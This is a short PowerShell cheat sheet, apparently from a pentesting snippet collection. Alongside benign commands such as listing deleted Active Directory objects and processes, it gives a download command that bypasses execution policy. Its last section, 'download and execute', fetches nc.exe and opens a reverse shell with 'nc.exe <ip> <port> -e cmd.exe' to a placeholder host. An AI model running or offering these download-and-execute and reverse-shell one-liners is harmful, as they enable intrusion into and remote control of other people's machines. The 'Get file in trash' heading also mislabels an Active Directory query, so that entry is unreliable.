# powershell

% powershell, command

## Get file in trash
```
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
```

## Get process
```
Get-Process
```

# download with powershell
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "(New-Object System.Net.WebClient).DownloadFile('http://<server>/<source_file>','<dest_file>')"
```

## download and execute with powershell
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile New-Object System.Net.WebClient.DownloadFile('<url_file>','nc.exe'); nc.exe <ip> <port> -e cmd.exe
```